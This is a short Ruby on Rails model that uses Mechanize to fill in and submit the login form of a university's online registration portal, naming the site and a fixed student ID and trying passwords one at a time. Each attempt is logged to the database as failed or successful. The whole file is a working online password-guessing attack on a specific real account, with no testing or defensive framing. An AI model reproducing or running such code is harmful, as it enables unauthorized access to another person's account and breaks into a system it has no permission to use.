class Trial < ActiveRecord::Base
	def self.try_with_password(pass)
		a = Mechanize.new{ |agent| agent.follow_meta_refresh = true }
		a.get('https://alexreg.aast.edu/aastreg/frm_login.aspx') do |page|
			@z = page
		end
		form = @z.form_with(:id => 'aspnetForm')
		form['ctl00$ContentPlaceHolder1$UserName'] = 14102222
		form['ctl00$ContentPlaceHolder1$Password'] = pass
		response = form.submit
		if response.body.include?("How To use New Online Registration Video")
			puts "Failed for #{pass}"
			Trial.create(password:pass)
		else
			Trial.create(password:pass, successful:true)
			puts "Successful for #{pass}"
		end
	rescue => e
	end
end